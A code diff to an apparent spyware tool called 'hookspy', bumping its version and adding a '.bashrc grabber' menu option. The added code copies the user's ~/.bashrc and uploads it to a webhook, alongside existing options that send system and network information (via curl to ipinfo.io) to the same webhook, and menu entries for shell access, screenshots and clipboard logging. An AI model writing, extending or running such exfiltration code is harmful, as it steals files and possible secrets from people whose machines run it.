@@ -11,13 +11,14 @@ print(f"Logged in as {user}")
 cwd = os.getcwd()
 while True:
     print(f"""
-    \n hookspy v0.1-alpha        https://github.com/realpnut/hookspy
+    \n hookspy v0.2-beta        https://github.com/realpnut/hookspy
     0 - Exit
     1 - Shell
     2 - System Info
     3 - Screenshot
     4 - Paperclip logger
     5 - Network Info
+    6 - .bashrc grabber
     """)
     uput = input("Choose an option: ")
 
@@ -54,3 +55,13 @@ while True:
         requests.post(WEBHOOK, data={"content": f"```{out}```"})
         out = os.popen("curl ipinfo.io").read()
         requests.post(WEBHOOK, data={"content": f"```{out}```"})
+    elif uput == "6":
+        os.system("cp ~/.bashrc /tmp/bashrc")
+        with open("/tmp/bashrc", "rb") as f:
+            requests.post(WEBHOOK, data={"content": f"```Grabbing .bashrc...```"})
+            requests.post(WEBHOOK, files={"file": f})
+        os.system("rm /tmp/bashrc")
+    elif uput == "0":
+        break
+    else:
+        print("Invalid option")
